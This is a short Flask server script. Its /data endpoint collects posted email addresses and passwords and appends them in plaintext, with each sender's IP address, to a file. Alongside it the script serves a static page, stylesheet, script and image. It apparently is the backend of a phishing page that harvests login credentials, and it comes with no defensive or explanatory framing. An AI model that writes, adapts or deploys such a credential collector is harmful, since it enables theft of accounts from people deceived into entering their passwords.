from flask import Flask, request, Response


app = Flask(__name__)

@app.route("/data", methods = ["POST"])
def get_data():
    data = request.json

    email = data["email"]
    password = data["password"]

    with open("data.txt", "r") as f:
        before = f.read()

    with open("data.txt", "w") as f:
        f.write(before)
        message = f'"{request.remote_addr}": ["email": "{email}", "password": "{password}"],\n'
        print(message)
        f.write(message)

    return Response("", 200)


@app.route("/")
def main():
    with open("static\\index.html", "rb") as f:
        return f.read().decode("utf-8")


@app.route("/style.css")
def style():
    with open("static\\style.css", "rb") as f:
        return f.read().decode("utf-8")


@app.route("/script.js")
def script():
    with open("static\\script.js", "rb") as f:
        return f.read().decode("utf-8")


@app.route("/back.svg")
def back():
    with open("static\\back.svg", "rb") as f:
        return f.read().decode("utf-8")


app.run()